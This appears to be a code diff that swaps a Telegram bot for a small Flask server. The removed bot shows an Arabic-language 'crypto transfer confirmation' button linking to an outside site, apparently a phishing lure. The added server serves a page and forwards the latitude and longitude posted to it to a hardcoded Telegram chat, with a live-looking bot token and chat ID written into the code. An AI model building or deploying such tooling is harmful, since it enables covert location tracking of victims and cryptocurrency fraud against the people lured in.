@@ -1,22 +1,26 @@
-import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+# app.py
+from flask import Flask, request
+import requests
+
+app = Flask(__name__)
 
 BOT_TOKEN = '8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0'
-REDIRECT_URL = 'https://boot-eg8h.onrender.com'
+CHAT_ID = '7485197107'
 
-bot = telebot.TeleBot(BOT_TOKEN)
+@app.route('/location', methods=['POST'])
+def receive_location():
+    data = request.get_json()
+    lat = data.get('lat')
+    lon = data.get('lon')
 
-@bot.message_handler(commands=['start'])
-def welcome(message):
-    keyboard = InlineKeyboardMarkup()
-    btn = InlineKeyboardButton("✅ تأكيد تحويل الأموال للمحفظة", url=REDIRECT_URL)
-    keyboard.add(btn)
+    text = f"📍 موقع جديد:\nLatitude: {lat}\nLongitude: {lon}"
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    requests.post(url, json={'chat_id': CHAT_ID, 'text': text})
+    return {'status': 'ok'}
 
-    text = (
-        "💸 *مرحبًا بك في بوت التحويل بالعملات الرقمية*\n"
-        "🔐 لتأكيد العملية، اضغط على الزر أدناه 👇"
-    )
-    bot.send_message(message.chat.id, text, reply_markup=keyboard, parse_mode='Markdown')
+@app.route('/')
+def index():
+    return open("index.html").read()
 
-print("🤖 Bot is running...")
-bot.infinity_polling()
+if __name__ == '__main__':
+    app.run()
